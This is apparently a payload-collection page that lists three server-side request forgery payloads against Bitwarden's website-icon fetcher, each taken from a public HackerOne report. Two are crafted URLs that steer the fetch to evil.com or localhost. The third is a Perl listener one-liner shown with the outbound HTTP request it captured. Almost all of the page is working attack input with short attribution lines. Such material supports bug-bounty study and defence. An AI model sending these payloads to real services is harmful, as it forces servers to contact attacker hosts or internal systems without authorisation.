# Bitwarden

3 payloads.

### `f3c0f078`

```
https://target.com/evil.com/icon.png
```

— [Server-Side Request Forgery in "target.com"](https://hackerone.com/reports/913276) · Bitwarden · [njgadhiya](https://hackerone.com/njgadhiya)

### `5c35bc12`

```
https://target.com/localhost/icon.png
```

— [Server-Side Request Forgery in "target.com"](https://hackerone.com/reports/913276) · Bitwarden · [njgadhiya](https://hackerone.com/njgadhiya)

### `d1b3969f`

```
root@2efebadd421d:/app# perl -MIO::Socket::INET -ne 'BEGIN{$l=IO::Socket::INET->new( LocalPort=>80,Proto=>"tcp",Listen=>5,ReuseAddr=>1); my $l=$l->accept(); while(<$l>){ print $_; }; close($l);}'
GET /PATH_IS_KEPT HTTP/1.1
Host: redacted
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
Accept-Language: en-US, en; q=0.8
Cache-Control: no-cache
Pragma: no-cache
Accept: text/html, application/xhtml+xml, app
```

— [Blind HTTP GET SSRF via website icon fetch (bypass of pull#812)](https://hackerone.com/reports/925527) · Bitwarden · [shielder](https://hackerone.com/shielder)
